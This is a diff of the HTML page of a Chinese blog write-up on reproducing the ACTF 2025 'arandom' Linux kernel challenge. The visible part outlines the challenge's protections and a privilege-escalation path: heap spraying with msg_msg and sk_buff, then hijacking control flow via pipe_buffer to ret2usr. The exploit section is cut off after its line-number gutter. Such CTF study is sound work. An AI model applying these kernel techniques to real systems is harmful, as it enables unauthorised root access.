@@ -1,26 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang=zh>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="最近复现的一个很随机的内核题，感觉学到了很多东西，特此记录一下  防护检查题目给了Kconfig，从中我们可以得到该内核版本为Linux 6.14.2，算很新的内核了，之前的很多手法大概率都会失效 启动脚本开启了kaslr，ban掉了io_uring，但是没有开启smep&#x2F;smap，意味着可以打ret2usr，仅需泄漏内核地址+控制内核执行流即可提权  原赛题出题人&#x2F;etc目">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="最近复现的一个很随机的内核题，感觉学到了很多东西，特此记录一下  防护检查题目给了Kconfig，从中我们可以得到该内核版本为Linux 6.14.2，算很新的内核了，之前的很多手法大概率都会失效 启动脚本开启了kaslr，ban掉了io_uring，但是没有开启smep&#x2F;smap，意味着可以打ret2usr，仅需泄漏内核地址+控制内核执行流即可提权  原赛题出题人&#x2F;etc目">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[ACTF 2025] arandom复现">
 <meta property="og:url" content="http://example.com/2025/05/14/ACTF-arandom/index.html">
@@ -37,176 +23,159 @@
 <meta property="article:tag" content="kernel">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/ACTF-arandom/root.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>[ACTF 2025] arandom复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
-<link rel="canonical" href="http://example.com/2025/05/14/ACTF-arandom/">
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh'
-  };
-</script>
-
-  <title>[ACTF 2025] arandom复现 | Blog de Назриндак</title>
-  
+    <!-- Umami Analytics -->
 
 
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
 
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li><!--
+     --><!--
+       --><li><a href="/tags">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/05/21/languages/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/15/ebpf1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/14/ACTF-arandom/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/14/ACTF-arandom/&text=[ACTF 2025] arandom复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/14/ACTF-arandom/&is_video=false&description=[ACTF 2025] arandom复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[ACTF 2025] arandom复现&body=Check out this article: http://example.com/2025/05/14/ACTF-arandom/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/14/ACTF-arandom/&name=[ACTF 2025] arandom复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/14/ACTF-arandom/&t=[ACTF 2025] arandom复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
     </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Blog de Назриндак</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">二进制安全爱好者</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">防护检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.1.</span> <span class="toc-text">寻找堆喷对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1%EF%BC%9Astruct-msg-msg"><span class="toc-number">3.2.</span> <span class="toc-text">错误的堆喷对象：struct msg_msg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%8D%A2%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1%EF%BC%9Astruct-sk-buff"><span class="toc-number">3.3.</span> <span class="toc-text">更换堆喷对象：struct sk_buff</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%89%A7%E8%A1%8C%E6%B5%81%EF%BC%9Astruct-pipe-buffer"><span class="toc-number">3.4.</span> <span class="toc-text">控制执行流：struct pipe_buffer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9Fget-root"><span class="toc-number">3.5.</span> <span class="toc-text">成功get root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88Exp%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">最终Exp（部分）</span></a></li></ol>
+      </div>
+    
+  </span>
 </div>
 
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/14/ACTF-arandom/">
+    <h1 class="posttitle p-name" itemprop="name headline">
+        [ACTF 2025] arandom复现
+    </h1>
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="NazrinDuck">
-      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog de Назриндак">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          [ACTF 2025] arandom复现
-        </h1>
 
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">NazrinDuck</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-14T09:20:57.000Z" class="dt-published" itemprop="datePublished">2025-05-14</time>
+        
+      
+    </div>
 
-              <time title="Created: 2025-05-14 17:20:57" itemprop="dateCreated datePublished" datetime="2025-05-14T17:20:57+08:00">2025-05-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-05-26 00:15:29" itemprop="dateModified" datetime="2025-05-26T00:15:29+08:00">2025-05-26</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
 
       
-        <blockquote>
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/kernel/" rel="tag">kernel</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
 <p>最近复现的一个很<strong>随机</strong>的内核题，感觉学到了很多东西，特此记录一下</p>
 </blockquote>
 <h2 id="防护检查"><a href="#防护检查" class="headerlink" title="防护检查"></a>防护检查</h2><p>题目给了Kconfig，从中我们可以得到该内核版本为<strong>Linux 6.14.2</strong>，算很新的内核了，之前的很多手法大概率都会失效</p>
@@ -309,195 +278,183 @@
 </blockquote>
 <h2 id="最终Exp（部分）"><a href="#最终Exp（部分）" class="headerlink" title="最终Exp（部分）"></a>最终Exp（部分）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span 